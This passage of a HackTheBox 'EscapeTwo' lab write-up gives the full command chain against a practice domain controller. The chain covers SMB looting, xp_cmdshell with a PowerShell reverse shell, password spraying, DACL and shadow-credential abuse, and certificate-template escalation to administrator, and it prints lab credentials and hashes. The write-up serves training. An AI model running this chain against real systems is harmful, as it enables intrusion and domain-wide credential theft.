&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl"> sudo nmap -sC -sV -p&amp;lt;ports&amp;gt; &amp;lt;ip&amp;gt; -oN targeted
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/2.png"
width="486"
height="554"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/2_hu_4ea4b4a3e291b08b.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/2_hu_cb1c65a6350e6cd.png 1024w"
loading="lazy"
alt="Image 2"
class="gallery-image"
data-flex-grow="87"
data-flex-basis="210px"
>&lt;/p>
&lt;p>Add the domains from the scan to your /etc/hosts file&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">10.10.11.51 DC01.sequel.htb sequel.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Well, taking a look at smb with smbclient using the credentials that HackTheBox gives us we can see the share names for this domain&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">smbclient -L 10.10.11.51 -U &lt;span class="s1">&amp;#39;rose&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/3.png"
width="432"
height="196"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/3_hu_fb652cce378ffe33.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/3_hu_3c7baf155f4c4d54.png 1024w"
loading="lazy"
alt="Image 3"
class="gallery-image"
data-flex-grow="220"
data-flex-basis="528px"
>&lt;/p>
&lt;p>There&amp;rsquo;s a share called Accounting Department, list the contents of it&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">smbclient //10.10.11.51/Accounting&lt;span class="se">\ &lt;/span>Department -U &lt;span class="s1">&amp;#39;rose&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>we can download the files hosted there&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">get accounts.xlsx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">get accounting_2024.xlsx
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/4.png"
width="604"
height="192"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/4_hu_debf88636f03901.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/4_hu_8b551d991e9b4e39.png 1024w"
loading="lazy"
alt="Image 4"
class="gallery-image"
data-flex-grow="314"
data-flex-basis="755px"
>&lt;/p>
&lt;p>You can see the contents of the accounts.xlsx file with &lt;a class="link" href="https://jumpshare.com/viewer/xlsx" target="_blank" rel="noopener"
>https://jumpshare.com/viewer/xlsx&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/6.png"
width="541"
height="183"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/6_hu_1983a143c9144cbd.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/6_hu_5764122f881f44ff.png 1024w"
loading="lazy"
alt="Image 6"
class="gallery-image"
data-flex-grow="295"
data-flex-basis="709px"
>&lt;/p>
&lt;h3 id="user-flag">User Flag
&lt;/h3>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">netexec mssql 10.10.11.51 -u sa -p &amp;lt;password&amp;gt; --local-auth -M mssql_priv
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now we&amp;rsquo;ve found another user (sa) to continue enumerating&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/8.png"
width="1001"
height="91"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/8_hu_ea62eba353ee58c7.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/8_hu_36fb689d16eb2ec7.png 1024w"
loading="lazy"
alt="Image 8"
class="gallery-image"
data-flex-grow="1100"
data-flex-basis="2640px"
>&lt;/p>
&lt;p>It&amp;rsquo;s a sysadmin, so we can get a reverse shell with xp_cmdshell in mssql, login to it using impacket mssqlclient&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">mssqlclient.py sa@10.10.11.51
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Enable xp_cmdshell with:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sp_configure &amp;#39;show advanced options&amp;#39;, 1;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RECONFIGURE;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sp_configure &amp;#39;xp_cmdshell&amp;#39;, 1;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">RECONFIGURE;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now execute the powershell reverse shell encoded in base64 with this, you can use &lt;a class="link" href="https://www.revshells.com/" target="_blank" rel="noopener"
>https://www.revshells.com/&lt;/a>:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">EXEC xp_cmdshell &amp;#39;powershell -e [base64ReverseShell]&amp;#39;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/9.png"
width="265"
height="70"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/9_hu_d6da6f4e2812ee64.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/9_hu_c26ef41205a3e6ff.png 1024w"
loading="lazy"
alt="Reverse Shell"
class="gallery-image"
data-flex-grow="378"
data-flex-basis="908px"
>&lt;/p>
&lt;p>Let&amp;rsquo;s start enumerating this machine, we can see a SQL2019 folder&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/10.png"
width="557"
height="414"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/10_hu_ae8de43dd281978b.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/10_hu_b03f13de89061c22.png 1024w"
loading="lazy"
alt="Contents of C folder"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
>&lt;/p>
&lt;p>there&amp;rsquo;s a file with credentials in ExpressAdv_ENU&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">cat sql-Configuration.INI
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Create a list with all the users and passwords you&amp;rsquo;ve found to do a password spraying attack and find any reused passwords&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">netexec smb 10.10.11.51 -u users.txt -p passwords.txt --continue-on-success
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/11.png"
width="602"
height="38"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/11_hu_444b58356db2cdbf.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/11_hu_7657876816ab8ecb.png 1024w"
loading="lazy"
alt="Reused password"
class="gallery-image"
data-flex-grow="1584"
data-flex-basis="3802px"
>&lt;/p>
&lt;p>ryan and sql_svc have the same password, so we can login to ryan using evilwinrm&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">evil-winrm -i 10.10.11.51 -u ryan -p &amp;lt;password&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now you can get the user flag
&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/12.png"
width="468"
height="222"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/12_hu_896a3dc3a5e9cf73.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/12_hu_e277f2b2225ef23f.png 1024w"
loading="lazy"
alt="User Flag"
class="gallery-image"
data-flex-grow="210"
data-flex-basis="505px"
>&lt;/p>
&lt;h3 id="root-flag">Root Flag
&lt;/h3>&lt;p>Using Bloodhound community edition we can find a path to Administrator using the credentials of ryan&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/19.png"
width="1379"
height="751"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/19_hu_4b34a6184971a1ef.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/19_hu_802a634224f4fbf6.png 1024w"
loading="lazy"
alt="Write Owner"
class="gallery-image"
data-flex-grow="183"
data-flex-basis="440px"
>&lt;/p>
&lt;p>Set the owner of the ca_svc account to ryan&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Current owner information below
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - SID: S-1-5-21-548670397-972687484-3496335370-512
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - sAMAccountName: Domain Admins
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> - distinguishedName: &lt;span class="nv">CN&lt;/span>&lt;span class="o">=&lt;/span>Domain Admins,CN&lt;span class="o">=&lt;/span>Users,DC&lt;span class="o">=&lt;/span>sequel,DC&lt;span class="o">=&lt;/span>htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> OwnerSid modified successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Grant Full Control Rights to ryan using DACL (Discretionary Access Control List) to escalate privileges&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> DACL backed up to dacledit-20250330-161623.bak
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> DACL modified successfully!
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Shadow Credentials attack&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad shadow auto -u &lt;span class="s1">&amp;#39;ryan@sequel.htb&amp;#39;&lt;/span> -p &lt;span class="s1">&amp;#39;WqSZAF6CysDQbGb3&amp;#39;&lt;/span> -account ca_svc -dc-ip 10.10.11.51
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Targeting user &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Generating certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Certificate generated
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Generating Key Credential
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Key Credential generated with DeviceID &lt;span class="s1">&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Adding Key Credential with device ID &lt;span class="s1">&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span> to the Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully added Key Credential with device ID &lt;span class="s1">&amp;#39;ed99220f-857c-1616-06bc-e50d6900d173&amp;#39;&lt;/span> to the Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Authenticating as &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span> with the certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Using principal: ca_svc@sequel.htb
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to get TGT...
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got TGT
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved credential cache to &lt;span class="s1">&amp;#39;ca_svc.ccache&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Trying to retrieve NT &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Restoring the old Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully restored the old Key Credentials &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> NT &lt;span class="nb">hash&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;ca_svc&amp;#39;&lt;/span>: 3b181b914e7a9d5508ea1e20bc2b7fce
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Find a vulnerable template with the hash of the ca_svc account&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad find -u &lt;span class="s1">&amp;#39;ca_svc@sequel.htb&amp;#39;&lt;/span> -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/16.png"
width="776"
height="228"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/16_hu_62a59755f8145c85.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/16_hu_7f7d482470429c27.png 1024w"
loading="lazy"
alt="Vulnerable Cert"
class="gallery-image"
data-flex-grow="340"
data-flex-basis="816px"
>&lt;/p>
&lt;p>Now upload the certificate template&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">KRB5CCNAME&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$PWD&lt;/span>/ca_svc.ccache certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-escape-two-writeup/17.png"
width="496"
height="73"
srcset="https://solarspectre.github.io/p/htb-escape-two-writeup/17_hu_f8228be16f78db04.png 480w, https://solarspectre.github.io/p/htb-escape-two-writeup/17_hu_bca956267eec87d1.png 1024w"
loading="lazy"
alt="Cert Uploaded"
class="gallery-image"
data-flex-grow="679"
data-flex-basis="1630px"
>&lt;/p>
&lt;p>Get the Admin Cert&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">certipy-ad req -u ca_svc -hashes &lt;span class="s1">&amp;#39;3b181b914e7a9d5508ea1e20bc2b7fce&amp;#39;&lt;/span> -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Certipy v4.8.2 - by Oliver Lyak &lt;span class="o">(&lt;/span>ly4k&lt;span class="o">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Trying to resolve &lt;span class="s1">&amp;#39;sequel.htb&amp;#39;&lt;/span> at &lt;span class="s1">&amp;#39;10.10.11.51&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Generating RSA key
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Requesting certificate via RPC
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Trying to connect to endpoint: ncacn_np:10.10.11.51&lt;span class="o">[&lt;/span>&lt;span class="se">\p&lt;/span>ipe&lt;span class="se">\c&lt;/span>ert&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Connected to endpoint: ncacn_np:10.10.11.51&lt;span class="o">[&lt;/span>&lt;span class="se">\p&lt;/span>ipe&lt;span class="se">\c&lt;/span>ert&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Successfully requested certificate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Request ID is &lt;span class="m">22&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Got certificate with multiple identifications
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> UPN: &lt;span class="s1">&amp;#39;administrator@sequel.htb&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DNS Host Name: &lt;span class="s1">&amp;#39;10.10.11.51&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Certificate has no object SID
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Saved certificate and private key to &lt;span class="s1">&amp;#39;administrator_10.pfx&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Now get the admin hash using the cert&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
